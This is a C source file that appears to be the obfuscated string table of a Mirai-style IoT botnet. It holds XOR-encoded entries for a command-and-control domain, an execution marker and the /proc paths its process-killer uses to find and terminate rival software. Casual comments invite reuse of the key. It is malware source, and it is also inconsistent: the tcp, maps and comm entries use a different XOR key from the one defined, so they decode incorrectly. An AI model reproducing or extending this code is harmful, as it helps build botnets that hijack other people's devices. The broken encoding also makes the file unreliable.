#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xdeaddaad; // u can change the key etc

struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    // change the to the bites it was encoded
	add_entry(TABLE_CNC_DOMAIN, "", 0);
    add_entry(TABLE_EXEC_SUCCESS, "\x71\x6A\x77\x70\x65\x66\x68\x61\x5B\x6D\x77\x5B\x70\x6C\x61\x5B\x6C\x6D\x77\x70\x6B\x76\x7D\x5B\x6B\x62\x5B\x71\x6A\x6D\x72\x61\x76\x77\x61\x04", 36);
    add_entry(TABLE_KILLER_PROC, "\x2B\x74\x76\x6B\x67\x2B\x04", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x2B\x61\x7C\x61\x04", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x2B\x62\x60\x04", 4); // /fd
    add_entry(TABLE_KILLER_CMDLINE, "\x2B\x67\x69\x60\x68\x6D\x6A\x61\x04", 9); // /cmdline
    add_entry(TABLE_KILLER_TCP, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x56\x41\x52\x22", 14); // tcp
    add_entry(TABLE_KILLER_MAPS, "\x0D\x4F\x43\x52\x51\x22", 6); // maps
    add_entry(TABLE_KILLER_COMM, "\x0D\x41\x4D\x4F\x4F\x22", 6); // comm

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;
    // i = 0, if i is less than the val, val length add i then 
    for (i = 0; i < val->val_len; i++)
    {//  ^ this index for below
     // val[i]
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }
}
